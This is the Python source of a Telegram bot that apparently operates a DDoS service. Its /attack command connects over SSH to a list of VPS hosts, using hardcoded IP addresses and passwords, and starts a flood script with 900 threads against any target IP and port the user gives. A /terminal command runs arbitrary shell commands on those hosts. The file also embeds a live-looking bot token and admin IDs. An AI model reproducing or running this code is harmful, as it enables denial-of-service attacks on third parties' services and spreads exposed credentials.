import asyncio
import logging
import re
import socket
import paramiko
from datetime import datetime
from aiogram import Bot, Dispatcher, Router, types
from aiogram.types import Message
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties

# === Configuration ===
TOKEN = "7888945736:AAFlm6gY3Ir6qvxGp90XaWd536TwPfNCItI"
ADMIN_IDS = [5193826370]
AUTHORIZED_USERS = set(ADMIN_IDS)
VPS_LIST = [
    ("stom_0", "144.202.50.24", "Stom@0000"),
    ("stom_0", "155.138.192.246", "Stom@0000"),
    ("stom_0", "45.77.189.11", "Stom@0000"),
    ("stom_0", "66.135.11.203", "Stom@0000"),	
]
DEFAULT_THREADS = 900
user_cooldowns = {}
ongoing_attack = False

# === Logging Setup ===
logging.basicConfig(
    level=logging.INFO,
    filename="bot.log",
    filemode="a",
    format="%(asctime)s - %(message)s"
)

# === Bot Setup ===
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=None))
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

# === Middleware ===
@router.message(lambda message: not (message.text and message.text.startswith(("/",)) and message.from_user.id in AUTHORIZED_USERS))
async def restrict(msg: Message):
    if msg.from_user.id not in AUTHORIZED_USERS:
        await msg.answer("❌ Unauthorized access.")

# === Commands ===
@router.message(Command("start"))
async def start_command(msg: Message):
    await msg.answer(f"🚨𝗛𝗜 👋 {msg.from_user.full_name}  𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗯𝗼𝘁  !\nUse /help to see commands.")

@router.message(Command("help"))
async def help_command(msg: Message):
    await msg.answer("""⚙️ Commands:
/attack ip port time ⚔️
/start - Start bot 🚀
/help - Show help ℹ️

👑 Admin:
/adduser id ➕
/removeuser id ➖
/addvps ip|user|pass 🖥️
/removevps ip 🗑️
/terminal ip command 💻
/threads num 🧵
/users 👥
/vpslist 🌐
/logs 📄
/status 📶""")

@router.message(Command("adduser"))
async def add_user(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return
    try:
        user_id = int(msg.text.split()[1])
        AUTHORIZED_USERS.add(user_id)
        await msg.answer(f"✅ User {user_id} added.")
    except:
        await msg.answer("Usage: /adduser id")

@router.message(Command("removeuser"))
async def remove_user(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return
    try:
        user_id = int(msg.text.split()[1])
        AUTHORIZED_USERS.discard(user_id)
        await msg.answer(f"❌ User {user_id} removed.")
    except:
        await msg.answer("Usage: /removeuser id")

@router.message(Command("users"))
async def list_users(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return
    await msg.answer("👥 Authorized Users:\n" + "\n".join(map(str, AUTHORIZED_USERS)))

@router.message(Command("addvps"))
async def add_vps(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return
    try:
        ip, user, pw = msg.text.split()[1].split("|")
        VPS_LIST.append((user, ip, pw))
        await msg.answer(f"✅ VPS {ip} added.")
    except:
        await msg.answer("Usage: /addvps ip|user|pass")

@router.message(Command("removevps"))
async def remove_vps(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return
    try:
        ip = msg.text.split()[1]
        VPS_LIST[:] = [v for v in VPS_LIST if v[1] != ip]
        await msg.answer(f"🗑️ VPS {ip} removed.")
    except:
        await msg.answer("Usage: /removevps ip")

@router.message(Command("threads"))
async def set_threads(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return
    global DEFAULT_THREADS
    try:
        DEFAULT_THREADS = int(msg.text.split()[1])
        await msg.answer(f"🧵 Threads set to {DEFAULT_THREADS}.")
    except:
        await msg.answer("Usage: /threads 100")

@router.message(Command("vpslist"))
async def list_vps(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return
    out = "\n".join([f"{ip} ({user})" for user, ip, _ in VPS_LIST])
    await msg.answer(f"🌐 VPS List:\n{out}")

@router.message(Command("terminal"))
async def terminal_command(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return
    try:
        _, ip, command = msg.text.split(maxsplit=2)
    except:
        return await msg.answer("Usage: /terminal <ip> <command>")

    vps = next((v for v in VPS_LIST if v[1] == ip), None)
    if not vps:
        return await msg.answer(f"❌ VPS with IP {ip} not found.")

    user, _, pw = vps
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=ip, username=user, password=pw, look_for_keys=False, allow_agent=False)
        shell = ssh.invoke_shell()
        shell.send("cd freeroot && bash root.sh\n")
        await asyncio.sleep(3)
        shell.send(command + "\n")
        await asyncio.sleep(2)
        output = shell.recv(65536).decode(errors="ignore")
        ssh.close()
        ansi_escape = re.compile(r'(?:\x1B[@-_][0-?]*[ -/]*[@-~])')
        cleaned_output = ansi_escape.sub('', output)
        await msg.answer(f"💻 Output from {ip}:\n\n{cleaned_output.strip() or '⚠️ No output received.'}")
    except Exception as e:
        await msg.answer(f"❌ SSH error on {ip}: {str(e)}")

@router.message(Command("logs"))
async def logs_command(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return
    try:
        with open("bot.log", "r") as f:
            logs = f.readlines()[-20:]
        await msg.answer("📄 Last 20 log lines:\n" + "".join(logs))
    except Exception as e:
        await msg.answer(f"⚠️ Error reading logs: {str(e)}")

@router.message(Command("status"))
async def status_command(msg: Message):
    if msg.from_user.id not in ADMIN_IDS:
        return
    statuses = []
    for _, ip, _ in VPS_LIST:
        try:
            socket.create_connection((ip, 22), timeout=3)
            statuses.append(f"✅ VPS {ip} is up")
        except:
            statuses.append(f"❌ VPS {ip} is down")
    await msg.answer("\n".join(statuses))

@router.message(Command("attack"))
async def attack_command(msg: Message):
    logging.info(f"/attack by {msg.from_user.id}: {msg.text}")
    global ongoing_attack
    if msg.from_user.id not in AUTHORIZED_USERS:
        return await msg.answer("Access Denied.")

    if ongoing_attack:
        return await msg.answer("⚠️ An attack is already running.")

    parts = msg.text.split()
    if len(parts) != 4:
        return await msg.answer("⚠️ Usage: /attack ip port time")

    try:
        _, target_ip, port, duration_str = parts
        duration = int(duration_str)
    except:
        return await msg.answer("❌ Invalid arguments. Example: /attack 1.1.1.1 80 60")

    now = asyncio.get_event_loop().time()
    if now - user_cooldowns.get(msg.from_user.id, 0) < 60:
        remaining = int(60 - (now - user_cooldowns[msg.from_user.id]))
        return await msg.answer(f"⏳ Cooldown active. Wait {remaining}s.")

    user_cooldowns[msg.from_user.id] = now
    ongoing_attack = True
    await msg.answer(f"🚀 Attack started on {target_ip}:{port} for {duration}s")

    for user, ip, pw in VPS_LIST:
        asyncio.create_task(run_attack(ip, user, pw, target_ip, port, duration, msg))

    await asyncio.sleep(duration)
    ongoing_attack = False

async def run_attack(ip, username, password, target_ip, port, duration, msg):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password)
        shell = ssh.invoke_shell()
        shell.send("cd freeroot && bash root.sh\n")
        await asyncio.sleep(3)
        shell.send("pkill -f runner.py\npm2 delete all || true\n")
        await asyncio.sleep(1)
        pname = f"attack_{ip.replace('.', '_')}"
        shell.send(f"pm2 start runner.py --name {pname} --interpreter python3 --no-autorestart -- {target_ip} {port} {duration} {DEFAULT_THREADS}\n")
        await asyncio.sleep(duration)
        shell.send(f"pm2 stop {pname}\npm2 delete {pname}\n")
        ssh.close()
        await msg.answer(f"✅ Attack completed on {ip}")
    except Exception as e:
        await msg.answer(f"❌ Error on {ip}: {e}")

async def main():
    print("Bot is polling...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())